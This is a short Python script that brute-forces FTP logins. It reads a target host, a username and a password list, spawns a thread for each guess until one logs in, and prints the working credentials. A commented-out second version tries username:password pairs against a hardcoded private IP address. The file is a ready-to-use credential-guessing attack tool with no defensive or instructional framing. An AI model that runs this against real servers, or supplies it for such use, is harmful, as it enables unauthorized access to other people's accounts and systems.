#! /usr/bin/python3
import ftplib
from socket import gethostbyname
from threading import Thread,ThreadError
from time import sleep
import sys


################     Login By Password Brute forcing    ###################
def bruteLogin(hostname,username,password):
    global login
    global success
    ftp = ftplib.FTP(hostname)
    print("[-] Testing {}/{}".format(username,password))
    try:
        ftp.login(username,password)
        success = "[+] Login Success on [{}] with {}:{}".format(hostname,username,password)
        ftp.close()
        login = True
    except:
        pass


if __name__ == "__main__":
    login = False
    success = ""
    target = input("Enter Target <IP or Hostname>: ")
    username = input("Enter Username:")
    passFile = input("Enter Password File <Path>: ")
    host = gethostbyname(target)
    print("Brute-Force Started on {}[{}]".format(host,target))
    with open(passFile,"r") as f:
        for line in f.readlines():
            line = line.strip('\n')
            threader = Thread(target=bruteLogin,args=(host,username,line))
            threader.start()
            if ThreadError:
                sleep(0.04)
            if login:
                print(success)
                sys.exit()

"""
################     Login By Username and Password Brute-forcing    ###################
def bruteLogin(hostname,passFile):
    with open(passFile,"r") as f:
        for line in f.readlines():
            username = line.split(":")[0]
            password = line.split(":")[1].strip("\r").strip("\n")
            print("[-]Trying {}/{}".format(username,password))
            try:
                ftp = ftplib.FTP(host=hostname)
                ftp.login(username,password)
                print("\n [+] Login Succeeded on {} using {}/{}".format(hostname,username,password))
                ftp.quit()
                return (username,password)
            except:
                pass

    print("Could Not Brute Force FTP crediencials")
    return (None,None)

if __name__ == "__main__":
    host = "192.168.0.112"
    passFile = "pass.txt"
    bruteLogin(host,passFile)
"""